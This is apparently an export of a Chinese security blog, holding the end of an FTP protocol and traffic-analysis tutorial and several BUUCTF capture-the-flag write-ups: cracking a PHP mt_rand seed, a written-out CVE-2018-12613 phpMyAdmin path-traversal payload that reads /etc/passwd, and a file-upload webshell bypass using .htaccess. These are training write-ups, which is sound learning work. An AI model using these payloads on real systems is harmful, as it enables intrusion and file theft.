<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">takagi@takagi-VirtualBox:~/Desktop$ ftp anonymous@10.0.2.15</span><br><span class="line">Connected to 10.0.2.15.</span><br><span class="line">220 (vsFTPd 3.0.5)</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: </span><br><span class="line">500 OOPS: vsftpd: refusing to run with writable root inside chroot()</span><br><span class="line">ftp: Login failed</span><br></pre></td></tr></table></figure>
<p>所以，可以在 <code>/var/ftp</code> 创建一个目录 <code>pub</code>
专门用来匿名用户上传文件，<code>pub</code> 权限设置为
777（其实只要其他用户对 <code>pub</code> 有写权限就可以了，也就是
<code>..7</code> 就行）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp&gt; cd pub</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||30370|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0               6 Mar 08 16:01 ooo.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; put up.txt </span><br><span class="line">local: up.txt remote: up.txt</span><br><span class="line">229 Entering Extended Passive Mode (|||30020|)</span><br><span class="line">150 Ok to send data.</span><br><span class="line">100% |***********************************|    12        1.82 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">12 bytes sent in 00:00 (1.04 KiB/s)</span><br></pre></td></tr></table></figure>
<h1 id="ftp-流量分析">3. FTP 流量分析</h1>
<blockquote>
<p>客户端：10.0.2.5；服务器：10.0.2.15</p>
</blockquote>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230308165943.png" /></p>
<blockquote>
<p>看不清楚的话可以在浏览器单独打开文件</p>
</blockquote>
<p>终端流程：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">takagi@takagi-VirtualBox:~/Desktop$ ftp ftpers@10.0.2.15</span><br><span class="line">Connected to 10.0.2.15.</span><br><span class="line">220 (vsFTPd 3.0.5)</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: </span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||30547|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-------    1 1001     1001          493 Mar 08 16:51 qwe.txt</span><br><span class="line">-rw-r--r--    1 1001     1001            6 Mar 08 11:44 test.txt</span><br><span class="line">-rw-------    1 1001     1001           12 Mar 08 12:15 up.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; get test.txt</span><br><span class="line"><span class="built_in">local</span>: test.txt remote: test.txt</span><br><span class="line">229 Entering Extended Passive Mode (|||30172|)</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> test.txt (6 bytes).</span><br><span class="line">100% |***********************************|     6       38.04 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">6 bytes received <span class="keyword">in</span> 00:00 (3.67 KiB/s)</span><br><span class="line">ftp&gt; put hell.txt</span><br><span class="line"><span class="built_in">local</span>: hell.txt remote: hell.txt</span><br><span class="line">229 Entering Extended Passive Mode (|||30611|)</span><br><span class="line">150 Ok to send data.</span><br><span class="line">100% |***********************************|   493        6.02 MiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">493 bytes sent <span class="keyword">in</span> 00:00 (313.23 KiB/s)</span><br><span class="line">ftp&gt; <span class="built_in">bye</span></span><br><span class="line">221 Goodbye.</span><br></pre></td></tr></table></figure>
<h2 id="登录">3.1. 登录</h2>
<ol type="1">
<li><p>当客户端发起 <code>ftp ftpers@10.0.2.15</code> 时，需要先建立 TCP
连接（控制连接），于是进行了 TCP 3 次握手；</p></li>
<li><p>3 次握手结束后，服务发送 FTP 的包，也就是 No. 4
的流量包，内容如下：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230308170126.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure></li>
<li><p>客户端收到后，需要回复一个 ACK （后面 ACK
不再说明），然后发起请求，也就是 No. 6，指定了用户
<code>ftpers</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230308170158.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure></li>
<li><p>服务器收到后，响应 No. 8，内容如下，要我们输入密码：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230308170231.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure></li>
<li><p>客户端收到后，输入密码 （注意，这里密码是明文传输），也就是 No.
10：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230308170304.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure></li>
<li><p>服务器确定密码正确后，响应 No. 12</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230308170336.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure></li>
<li><p>后面的流量就是一些登录后的命令，比如
<code>FEAT</code>、<code>EPRT</code>、<code>PASV</code> 可以在 [[#4.
参考]] 的第 14 篇文章中找到结果，直接跳过；</p></li>
</ol>
<h2 id="下载文件被动模式">3.2. 下载文件（被动模式）</h2>
<blockquote>
<p>查看下载文件 <code>test.txt</code> 的流量：</p>
</blockquote>
<ol type="1">
<li><p>跳过 <code>ls</code> 这些命令的流量，直接看 No.
61，客户端向服务器请求 <code>test.txt</code>，</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230308170609.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure></li>
<li><p>可以看到 61 之后，服务器回应了一个 <code>EPSV</code>
和一个紧接着的流量然后就进行了 TCP 3 次握手，这个 <code>EPSV</code>
后面紧跟着的流量 (No. 64)很有意思，内容如下，它在内容中说明了一个端口
30172，这其实就是被动模式下，服务器告诉客户端用来传输数据的临时端口，后面的
3 次握手也正是为了建立数据连接，可以放一张 3 次握手的流量内容（客户端的
ACK，第 3 次握手）；</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230308171002.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230308171131.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure></li>
<li><p>客户端又发送了一个
<code>RETR test.txt</code>，意思是下载该文件；</p></li>
<li><p>服务器响应后，开始在数据连接上传输数据（流量 No. 70 到 No.
75），下图是 No. 79，红框圈出来的一个是双方端口，另一个是文件内容；</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230308171703.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure></li>
</ol>
<p>上传文件的步骤同下载文件，只是命令不同。</p>
<h2 id="上传文件主动模式">3.3. 上传文件（主动模式）</h2>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230308193819.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>在上传文件之前，也就是 <code>put hell00.txt</code> 这句话会执行 4
个步骤：</p>
<ol type="1">
<li><p>客户端告诉服务器，自己开放的端口，也就是上图中的 No. 44</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230308194021.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure></li>
<li><p>然后正式发送命令 <code>STOR hell00.txt</code>，流量 No.
46</p></li>
<li><p>TCP 3 次握手建立数据连接（有服务器主动建立），流量 No.
47、48、49；</p></li>
<li><p>通过数据连接上传数据，流量 No. 51；</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230308194240.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure></li>
</ol>
<h1 id="参考">4. 参考</h1>
<ol type="1">
<li><a
href="https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE">文件传输协议
- 维基百科，自由的百科全书</a></li>
<li><a href="https://zh.wikipedia.org/wiki/FTPS">FTPS -
维基百科，自由的百科全书</a></li>
<li><a
href="https://baike.baidu.com/item/FTP/13839">FTP（文件传输协议）_百度百科</a></li>
<li><a
href="https://zhuanlan.zhihu.com/p/34109504">浅谈FTP协议的工作方式 -
知乎</a></li>
<li><a
href="https://www.cnblogs.com/luoxn28/p/5585458.html">深入理解FTP协议 -
luoxn28 - 博客园</a></li>
<li><a
href="https://juejin.cn/post/7119502508786974733#heading-1">详解ftp协议，力荐！！！
- 掘金</a></li>
<li><a href="https://www.linuxprobe.com/chapter-11.html">第11章
使用Vsftpd服务传输文件。 | 《Linux就该这么学》</a></li>
<li><a href="https://www.youtube.com/watch?v=i5furEJlySY">Solved: issue
with FTP server (229 Entering Extended Passive Mode</a></li>
<li><a
href="https://www.linuxquestions.org/questions/linux-newbie-8/500-oops-could-not-read-chroot-list-file-etc-vsftpd-chroot_list-4175426540/">[SOLVED]
500 OOPS: could not read chroot () list file:/etc/vsftpd.
chroot_list</a></li>
<li><a
href="https://www.myfreax.com/how-to-setup-ftp-server-with-vsftpd-on-ubuntu-20-04/">如何在ubuntu
20.04使用vsftpd设置ftp服务器 | myfreax</a></li>
<li><a
href="https://blog.csdn.net/qq_38423256/article/details/119773336">vsftpd配置chroot_list_enable、chroot_local_user、chroot_list_file说明_喜羊羊love红太狼的博客-CSDN博客</a></li>
<li><a
href="https://ma.ttias.be/vsftpd-linux-500-oops-vsftpd-refusing-run-writable-root-inside-chroot/">vsftpd
on linux: 500 OOPS: vsftpd: refusing to run with writable root inside
chroot()</a></li>
<li><a
href="https://gnu-linux.readthedocs.io/zh/latest/Chapter02/90_vsftpd.html">vsftpd
配置文件 — Linux latest 文档</a></li>
<li><a
href="https://zh.wikipedia.org/zh-hans/FTP%E5%91%BD%E4%BB%A4%E5%88%97%E8%A1%A8">FTP命令列表
- 维基百科，自由的百科全书</a></li>
</ol>
]]></content>
      <categories>
        <category>计算机基础</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
        <tag>FTP协议</tag>
      </tags>
  </entry>
  <entry>
    <title>GWCTF 2019 枯燥的抽奖</title>
    <url>/2022/04/26/GWCTF%202019%20%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/</url>
    <content><![CDATA[<p>题目地址：<a
href="https://buuoj.cn/challenges#%5BGWCTF%202019%5D枯燥的抽奖">GWCTF
2019 枯燥的抽奖</a></p>
<span id="more"></span>
<h1 id="题目信息">1. 题目信息</h1>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426143656.png" /></p>
<p>需要我们写入完整的字符串，并且已经给了我们前十位。查看源码得到一个文件：check.php，直接访问，得到如下源码：
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=substr(<span class="variable">$str_long1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = substr(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]===<span class="variable">$str</span>)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">&quot;check.php&quot;</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="php伪随机数">2. PHP伪随机数</h1>
<p>详细的可以看一下下面的资料：</p>
<ul>
<li>[[PHP知识点#21 mt_srand和mt_rand伪随机数破解]]</li>
<li>参考：<a href="https://www.freebuf.com/vuls/192012.html">PHP
mt_rand安全杂谈及应用场景详解 - FreeBuf网络安全行业门户</a></li>
</ul>
<p>这里简单的说下什么叫做伪随机数。<strong>随机数</strong>，顾名思义就是在给定范围内随机选择的数，没有任何规律可言。<strong>伪随机数</strong>，<strong>满足一定的规律</strong>，但是这些数字能够通过随机数检验。</p>
<p>php通过mt_srand()和mt_rand()两个函数实现伪随机数的生成。首先利用mt_srand(seed)传入一个种子（简单来说，就是确定某种规律），然后利用mt_rand(范围)生成特定范围内的伪随机数。</p>
<p>举个不靠谱的例子：假设某个函数y=ax+b，而我们传入的seed就是x，a和b都是给定常数。那么只要确定了x，就能够得到y；反之，如果我们有y，就能够得到x。</p>
<p>因此，利用php伪随机数生成的密码或者token是不安全的。可以利用下面的工具破解：</p>
<ul>
<li>工具：<a href="https://www.openwall.com/php_mt_seed/">php_mt_seed -
PHP mt_rand() seed cracker</a></li>
</ul>
<h1 id="解题">3. 解题</h1>
<p>首先分析一下代码，可以简单的分为三个部分。</p>
<h2 id="第一部分">3.1. 第一部分</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先开启一个session，然后如果我们的请求报中没有seed，则就随机一个值当作seed。</p>
<h2 id="第二部分">3.2. 第二部分</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mt_srand(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=substr(<span class="variable">$str_long1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = substr(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>这是最重要的部分。首先通过mt_srand()函数设置一个种子，即上一部分的seed，然后从大小写字母和数字中随机挑选20个（可重复）构成str。选取str的前10位显示出来。</p>
<h2 id="第三部分">3.3. 第三部分</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]===<span class="variable">$str</span>)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们需要通过POST方式提交参数num的值，然后与上一部分得到的20位的str做对比，如果一致，则get
flag。</p>
<h2 id="payload构造">3.4. payload构造</h2>
<p>其实看到这题目，我最先想到的是爆破后10位。这种方法的注意点是，需要保持session，否则每请求一次，str就发生了变化。后来粗略计算了一下，需要
<span class="math inline">\(62^{10}\)</span>
的请求次数，理论上可行，但我感觉不是这么做。后来经过搜索发现了PHP伪随机数漏洞。</p>
<p>首先，编写如下代码，将给出的10个字符转变成php_mt_seed能够识别的数据：
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">substr = <span class="string">&quot;R3s7A1z54e&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">length = <span class="built_in">len</span>(str1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(substr)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, length):</span><br><span class="line">        <span class="keyword">if</span> str1[j] == substr[i]:</span><br><span class="line">            res += <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(length-<span class="number">1</span>) + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line"><span class="number">53</span> <span class="number">53</span> <span class="number">0</span> <span class="number">61</span> <span class="number">29</span> <span class="number">29</span> <span class="number">0</span> <span class="number">61</span> <span class="number">18</span> <span class="number">18</span> <span class="number">0</span> <span class="number">61</span> <span class="number">33</span> <span class="number">33</span> <span class="number">0</span> <span class="number">61</span> <span class="number">36</span> <span class="number">36</span> <span class="number">0</span> <span class="number">61</span> <span class="number">27</span> <span class="number">27</span> <span class="number">0</span> <span class="number">61</span> <span class="number">25</span> <span class="number">25</span> <span class="number">0</span> <span class="number">61</span> <span class="number">31</span> <span class="number">31</span> <span class="number">0</span> <span class="number">61</span> <span class="number">30</span> <span class="number">30</span> <span class="number">0</span> <span class="number">61</span> <span class="number">4</span> <span class="number">4</span> <span class="number">0</span> <span class="number">61</span></span><br></pre></td></tr></table></figure></p>
<p>然后执行： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./php_mt_seed 53 53 0 61 29 29 0 61 18 18 0 61 33 33 0 61 36 36 0 61 27 27 0 61 25 25 0 61 31 31 0 61 30 30 0 61 4 4 0 61</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426151032.png" /></p>
<p>得到seed。</p>
<p>最后，编写如下php代码，生成20个字符，因为seed相同，因此生成的这20个字符与题目的一致。
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">566162825</span>); </span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=substr(<span class="variable">$str_long1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这里有一个值得注意的点！！！那就是php版本要选对！！！要和工具给出的seed旁边的版本相匹配才能够生成一样的字符串！！！</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426151517.png" /></p>
<p>将得到的payload用POST方式提交即可。</p>
<blockquote>
<p>这过程中，要保持浏览器不要关闭，否则session就断了，那么seed可能就不一样了。</p>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP伪随机数</tag>
      </tags>
  </entry>
  <entry>
    <title>GWCTF 2019 我有一个数据库</title>
    <url>/2022/03/24/GWCTF%202019%20%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境之后，不论是数据包还是页面源码，什么信息都没有，只有如下看不懂的字</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204732.png" /></p>
<p>因此，决定扫描目录，结果如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204816.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204824.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204843.png" /></p>
<p>将所有都访问一次，发现只有 <code>/phpmyadmin</code>
有用，界面如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204938.png" /></p>
<h1 id="解题">解题</h1>
<p>通过该页面发现：</p>
<ol type="1">
<li><p>phpmyadmin 版本为 4.8.1</p></li>
<li><p>服务器用的是 apache</p></li>
<li><p>数据库是 mysql</p></li>
<li><p>PHP版本信息为 7.2.24-0ubuntu0.18.04.1</p></li>
<li><p>系统为 Ubuntu</p></li>
</ol>
<p>第一次碰到这种题目，有点懵逼，就去百度了一下
<code>phpmyadmin 4.8 漏洞</code> 发现了存在 <code>CVE-2018-12613</code>
远程文件包含漏洞。将找到的payload（这里要注意系统是Windows还是Linux）尝试一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../etc/passwd # linux payload</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205506.png" /></p>
<p>发现确实存在漏洞，那么将 <code>/etc/passwd</code>
改为我们想要的文件路径即可。问题是这里我们不知道 flag
在哪，一般在根目录或者网站目录，这里只知道根目录，所以就尝试以下根目录，即</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure>
<p>得到 flag</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205738.png" /></p>
<h1 id="总结">总结</h1>
<p>本题考的是平常的总结，以及对信息的敏感度。看到一些版本信息要想到是否存在该版本特有的信息，并且即使搜索。平常遇到这类的问题也要多积累。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>phpmyadmin 漏洞</tag>
        <tag>CVE-2018-12613</tag>
      </tags>
  </entry>
  <entry>
    <title>GXYCTF2019 BabyUpload</title>
    <url>/2022/03/21/GXYCTF2019%20BabyUpload/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>打开环境可以很明显看到，这就是一个文件上传的题目。 <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321194818.png" /></p>
<h1 id="过滤测试">过滤测试</h1>
<h2 id="过滤类型测试">过滤类型测试</h2>
<p>随便上传一个图片 <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195148.png" /></p>
<p>根据提示 <code>上传类型</code> 推测应该需要修改
<code>Content-Type</code>，尝试 <code>image/gif</code> 和
<code>imag/jpeg</code> 后，发现后者是可以的。 <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195315.png" /></p>
<h2 id="过滤后缀测试">过滤后缀测试</h2>
<p>将后缀修改为 <code>php</code> ，上传 <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195444.png" /></p>
<p>经过多次尝试，发现我无法绕过这个过滤。此时思考，是否可以不用特定后缀又可以上传文件，想到了
<code>.htaccess</code> 。尝试一下发现成功！ <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195835.png" /></p>
<p>记录一下地址
<code>/var/www/html/upload/0ac6e66ec314df83922a1ebbbdf6e358/.htaccess</code>。之后，只要上传一个文件名为
<code>shell.jpg</code> 的木马即可。</p>
<h2 id="文件内容过滤">文件内容过滤</h2>
<p>写入一句话木马，然后上传，果不其然被过滤了。 <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200100.png" /></p>
<p>换一种写法发现还是不行 <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200308.png" /></p>
<p>猜测过滤的应该是开头的那个 <code>php</code>
。因此，换一种写法，成功绕过。 <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200502.png" /></p>
<p>记录上传地址：<code>/var/www/html/upload/0ac6e66ec314df83922a1ebbbdf6e358/shell.jpg</code></p>
<h1 id="蚁剑连接get-flag">蚁剑连接get flag</h1>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200538.png" /></p>
<p>flag在根目录 <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200555.png" /></p>
<p>成功。</p>
<h1 id="总结">总结</h1>
<ol type="1">
<li>要熟悉常用的上传类型，题目中大多考察的是图片，因此要熟记：<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>；</li>
<li>当脚本后缀被过滤之后，并且无法绕过时，需要想到
<code>.htaccess</code>；</li>
<li>文件内容的过滤，需要知道多种木马的写法。</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>GXYCTF2019 禁止套娃</title>
    <url>/2022/03/24/GXYCTF2019%20%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">1. 题目信息</h1>
<p>进入环境之后发现什么信息都没有，数据包和源码都没有有用的信息。因此尝试扫描目录。但是我没有扫描出什么结果，可能是脚本不够强大吧。折腾无果后去搜索一下别人的WP，发现存在
<code>git</code> 泄露，因此使用 <code>githack</code>
下载。下载得到源码：</p>
